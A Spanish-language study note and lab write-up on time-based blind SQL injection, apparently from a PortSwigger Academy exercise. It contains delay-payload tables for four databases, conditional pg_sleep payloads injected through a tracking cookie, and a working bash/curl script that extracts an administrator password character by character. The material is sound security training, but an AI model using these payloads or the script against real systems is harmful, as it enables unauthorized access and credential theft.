Si la aplicación detecta **errores de base de datos** con una consulta SQL y los gestiona correctamente, no habrá ninguna diferencia en la respuesta de la aplicación. Este es uno de los casos en dónde es conveniente explotar la vulnerabilidad de la **inyección SQL ciega con retrasos temporales** en función de si una condición inyectada es verdadera o falsa.

Como las consultas SQL normalmente se procesan de forma sincrónica por la aplicación, retrasar la ejecución de una consulta SQL también retrasa la respuesta HTTP validando la condición inyectada en función del tiempo que se tarda en recibir la respuesta HTTP.

Las técnicas para activar un retraso de tiempo son específicas del tipo de base de datos que se utilice.
Por ejemplo, en **Microsoft SQL Server**, puede utilizar lo siguiente para probar una condición y activar un retraso en función de si la expresión es verdadera:

La siguiente entrada no genera un retraso, porque la condición ``1=2`` es falsa.
```SQL
'; IF (1=2) WAITFOR DELAY '0:0:10'--
```
La segunda entrada genera un retraso de 10 segundos, porque la condición ``1=1`` es verdadera.
```SQL
'; IF (1=1) WAITFOR DELAY '0:0:10'--
```

Usando esta técnica, podemos recuperar datos probando un carácter a la vez:
```SQL
'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
```

>[!NOTE]
>Existen formas de activar delays en las consultas SQL dependiendo de técnicas y tipos de bases de datos. 

#### Time delays

Lo siguiente generará un retraso temporal incondicional de 10 segundos.

	| Oracle     | dbms_pipe.receive_message(('a'),10)|
	| Microsoft  | WAITFOR DELAY '0:0:10'             |
	| PostgreSQL | SELECT pg_sleep(10)                |
	| MySQL      |SELECT SLEEP(10)                    |

Para probar una única condición booleana y activar un retraso de tiempo si la condición es verdadera.

	| Oracle     | SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual    |
	| Microsoft  | IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'  |
	| PostgreSQL | SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END |
	| MySQL      | SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a')`    |

#### Laboratorio SQLi ciega con retrasos de tiempo y recuperación de información

Este laboratorio con una vulnerabilidad de inyección SQL ciega. La aplicación utiliza una cookie de seguimiento para realizar análisis y realiza una consulta SQL que contiene el valor de la cookie enviada.
Los resultados de la consulta SQL no se devuelven y la aplicación *no responde de manera diferente en función de si la consulta devuelve filas o genera un error*. Sin embargo, dado que la consulta se ejecuta de manera sincrónica, es posible activar demoras de tiempo condicionales para inferir información.
La base de datos contiene una tabla diferente llamada users, con columnas llamadas username y password. Debe aprovechar la vulnerabilidad de inyección SQL ciega para averiguar la contraseña del usuario administrator.

**Para resolver el laboratorio, aproveche la vulnerabilidad de inyección SQL para generar una demora de 10 segundos e inicie sesión como usuario administrador..**

![[Pasted image 20250218153115.png]]

Ubicamos los parámetros que nos servirán, en este caso la session y el trackingId
![[Pasted image 20250218161235.png]]

Realizamos una inyección con el navegador, que no resultó.
![[Pasted image 20250218161617.png]]

Utilizamos BurpSuite 
![[Pasted image 20250218165548.png]]

Y se encontró que la inyección por tiempo es efectiva
![[Pasted image 20250218165751.png]]


- `'` : Cierra el string original
- `||` : Operador de concatenación en PostgreSQL  
- `pg_sleep(5)` : Función que pausa la ejecución por 10 segundos
- `-- ` : Comenta el resto de la query

Procedemos a crear una condición basada en caracteres del password.
substring extrae el primer caracter de `password` en este caso con `'a'`
```SQL
' || (SELECT CASE WHEN (SUBSTRING(password,1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username='administrator')--
```
- Compara el carácter en la posición actual del campo `password`
- Si coincide con el carácter probado, pausa 10 segundos (`pg_sleep(10)`)
- Si no coincide, no pausa (`pg_sleep(0)`)

![[Pasted image 20250218170436.png]]

```bash
#!/bin/bash

url="https://0a8500f4031f806fecff7d3700d800de.web-security-academy.net/"
session="L2V2ajuZMRVVQMAgqEL2Ud7WMWTOTDdc"
tracking_id="FOC9ammoW32Uub3e"

password=""

echo "Iniciando ataque..."

Para cada posición del 1 al 20 (asumiendo que la contraseña es de 20 caracteres):
    Prueba cada posible carácter (letras a-z y números 0-9):
        payload="${tracking_id}'||(SELECT CASE WHEN SUBSTRING(password,$pos,1)='$char' THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username='administrator')--"
        cookies="TrackingId=$payload; session=$session"
        
        start=$(date +%s)
        Envía la petición web con esta inyección
        Mide el tiempo de respuesta
        
        Si la respuesta tarda ≥10 segundos:
            Guarda el carácter como válido
	        Pasa a probar la siguiente posición
        fin Si
    fin para
fin para
```

El código final es el siguiente:
```bash
#!/bin/bash

url="https://0a8500f4031f806fecff7d3700d800de.web-security-academy.net/"
session="L2V2ajuZMRVVQMAgqEL2Ud7WMWTOTDdc"
tracking_id="FOC9ammoW32Uub3e"

password=""

echo "Iniciando ataque..."

for ((pos=1; pos<=20; pos++)); do
    for char in {a..z} {0..9}; do
        payload="${tracking_id}'||(SELECT CASE WHEN SUBSTRING(password,$pos,1)='$char' THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username='administrator')-- "
        cookies="TrackingId=$payload; session=$session"
        
        start=$(date +%s.%N)
        curl -s -L -b "$cookies" "$url" >/dev/null
        duration=$(echo "$(date +%s.%N) - $start" | bc)
        
        if (( $(echo "$duration >= 10" | bc -l))); then
            password+=$char
            echo -ne "\rPassword parcial: $password"
            break
        fi
    done
done

echo -e "\n[+] Password final: $password"
```

Ejecutando el código, obtenemos una contraseña
![[Pasted image 20250218174335.png]]

